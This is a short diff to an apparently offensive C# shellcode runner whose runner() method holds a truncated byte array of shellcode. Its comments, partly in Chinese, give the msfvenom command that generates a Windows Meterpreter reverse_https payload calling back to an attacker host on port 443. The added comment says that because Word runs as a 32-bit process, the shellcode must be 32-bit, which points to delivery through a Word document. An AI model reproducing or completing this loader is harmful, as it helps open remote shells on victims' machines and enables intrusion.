@@ -23,7 +23,8 @@ namespace ClassLibrary1
 
         public static void runner()
         {
-            // 生成 Shellcode : sudo msfvenom -p windows/x64/meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp 
+            // 生成 Shellcode : sudo msfvenom -p windows/(x64/)meterpreter/reverse_https LHOST=XXX LPORT=443 EXITFUNC=thread -f csharp
+            // 注意, Word 是作为 32 位进程运行的, 所以生成的 Shellcode 也必须是 32 位 !
             byte[] buf = new byte[800] {0xfc,0x48,0x83,0xe4,0xf0,0xe8...};
 
             int size = buf.Length;
